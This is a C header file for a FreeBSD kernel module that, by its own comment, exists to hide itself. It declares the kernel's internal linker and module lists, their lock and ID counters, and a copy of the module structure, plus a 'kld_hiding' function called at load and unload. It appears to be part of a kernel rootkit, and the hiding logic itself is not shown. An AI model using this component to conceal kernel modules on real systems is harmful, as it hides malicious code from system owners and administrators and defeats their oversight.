#ifndef _KLD_HIDING_H
#define _KLD_HIDING_H

#include <sys/types.h>
#include <sys/queue.h>
#include <sys/sysproto.h>
#include <sys/param.h>
#include <sys/module.h>
#include <sys/linker.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include "magick.h"

/*
 * The following is the list of variables you need to reference in order
 * to hide this module, which aren't defined in any header files.
 */
extern linker_file_list_t linker_files;
extern struct sx kld_sx;
extern int next_file_id;

typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;

struct module {
   TAILQ_ENTRY(module) link;  // chain together all modules
   TAILQ_ENTRY(module) flink; // all modules in a file
   struct linker_file *file;  // file which contains this module
   int refs;                  // reference count
   int id;                    // unique id number
   char *name;                // module name
   modeventhand_t handler;    // event handler
   void *arg;                 // argument for handler
   modspecific_t data;        // module specific data
};

/* The function called at load/unload. */
void kld_hiding(struct module *module, char *kld_file_name, char *kld_name);
#endif
